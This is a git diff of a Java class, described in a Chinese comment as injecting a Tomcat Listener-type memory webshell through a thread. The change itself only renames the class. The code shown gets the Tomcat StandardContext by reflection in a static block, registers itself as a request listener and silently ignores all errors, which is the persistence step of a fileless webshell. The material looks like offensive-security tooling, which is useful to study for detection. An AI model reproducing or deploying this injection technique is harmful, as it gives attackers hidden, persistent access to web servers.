@@ -15,7 +15,7 @@ import java.lang.reflect.Field;
 /**
  * 使用线程注入 Tomcat Listener 型内存马
  */
-public class TFMSFromThreadLi implements ServletRequestListener {
+public class TLMSFromThread implements ServletRequestListener {
     static {
         try {
             // 获取 standardContext
@@ -35,7 +35,7 @@ public class TFMSFromThreadLi implements ServletRequestListener {
                 standardContext = (StandardContext) field2.get(root);
             }
 
-            TFMSFromThreadLi listener = new TFMSFromThreadLi();
+            TLMSFromThread listener = new TLMSFromThread();
             standardContext.addApplicationEventListener(listener);
         } catch (Exception ignored) {
         }
